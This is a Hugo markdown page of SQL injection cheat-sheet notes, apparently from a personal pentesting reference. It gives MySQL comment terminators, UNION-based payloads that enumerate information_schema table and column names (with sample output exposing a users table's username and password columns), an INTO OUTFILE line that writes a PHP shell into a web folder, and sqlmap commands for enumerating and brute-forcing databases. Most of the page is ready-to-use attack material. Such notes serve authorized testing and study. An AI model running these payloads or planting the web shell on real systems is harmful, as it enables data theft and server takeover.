---
### The title for the content.
title : "SQL Injection"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "sql injection"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description : "SQL Injection description."
### The datetime assigned to this page.
date : 2020-03-10T16:43:45+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "sql-injection"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## sql injection


## External stuff

[exploit-db](https://www.exploit-db.com/papers/13045/) [ASCII table](https://github.com/justin-p/sec-stuff/blob/master/general%20info/ascii-table.md)

### Always True

1=1 a=a

### Escape/stop

#### mysql 

```sql
# 
-- 
#--
```

### MySQL Verison

select version\(\)

### information Schema

#### Table names

```sql
SELECT table_schema,table_name FROM information_Schema.tables

SELECT CONCAT(table_schema,table_name) FROM information_Schema.tables

SELECT CONCAT(table_schema,char(58),table_name) FROM information_Schema.tables
```

#### Injection example 1

```sql
' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 ORDER BY table_name LIMIT 0,1) #--
```

```text
dummymalex:dummyms
table_schema = dummymalex
table_name   = dummyms
```

#### Hide stuff we dont need

```sql
AND table_schema != 'information_schema'
```

#### Injection example 2

```sql
' union (select CONCAT(table_schema,char(58),table_name) from information_Schema.tables where 1=1 AND table_schema != 'information_schema' ORDER BY table_name LIMIT 0,1) #--
```

```text
LIMIT 0,1
dummymalex:dummyms 
table_schema = dummymalex
table_name   = dummyms 

LIMIT 1,1 
dummymalex:users     
table_schema = dummymalex
table_name   = users
```

#### column\_name

```sql
SELECT column_schema,column_name FROM information_Schema.columns
```

#### Injection Example 1

```sql
' union (select CONCAT(column_name) from information_Schema.columns where table_name='dummyms' LIMIT 0,1) #--
```

```text
LIMIT 0,1
ID

LIMIT 1,1
dummyms

LIMIT 2,1
description
```

#### Injection Example 2

```sql
' union (select CONCAT(column_name) from information_Schema.columns where table_name='users' LIMIT 0,1) #--
```

```text
LIMIT 0,1
ID

LIMIT 1,1
username

LIMIT 2,1
password
```

### upload shell with INTO OUTFILE

```sql
select 'SHELLCODE' INTO OUTFILE '/path/to/public/folder/shell.php';
```

## SQLmap

### Simple usage

```
sqlmap -u "http://target_server/"
```

### Set target DBMS to MySQL
```
sqlmap -u "http://target_server/" --dbms=mysql
```

### Use POST requests

```
sqlmap -u "http://target_server/" --data=param1=value1&param2=value2
```

### Use POST request file

```
sqlmap -r request.txt -p [param-to-test]
```

### Batch run

```
sqlmap -r request.txt -p [param-to-test] --Batch
```

### Set Risk/Level

```
sqlmap -r request.txt -p psw --level=5 --risk=3 --dbms mysql --batch
```

### enumerate databases

```
sqlmap -r request.txt --batch --dbs
``` 

### enumerate tables

``` 
sqlmap -r request.txt -batch --tables
``` 

### brute-force tables

```
sqlmap -r request.txt -batch --common-tables
```

### brute-force columns

```
sqlmap -r request.txt -batch -T users --common-column
```